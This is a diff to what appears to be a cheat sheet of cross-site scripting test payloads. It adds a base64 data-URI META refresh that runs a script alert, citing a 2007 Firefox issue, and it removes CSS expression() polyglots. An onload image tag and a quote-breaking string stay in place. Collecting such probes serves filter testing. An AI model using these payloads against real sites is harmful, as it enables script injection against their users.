@@ -31,10 +31,11 @@ double encoded <TEST WITH PROXY>
 // browser output
 <IMG alt=``onload=xss() src="test.jpg">
 
+Data URIs 
+[From 2007](https://www.gnucitizen.org/blog/bugs-in-the-browser-firefoxs-data-url-scheme-vulnerability/)
+> <META http-equiv="refresh" content="5;URL=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=">
+> data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=
 
-Polyglots 
-<~/XSS/*-*/STYLE=xss:e/**/xpression(alert(6))>
-<%tag style="xss:expression(alert(6))">
 
 <s>000'")};--//
 
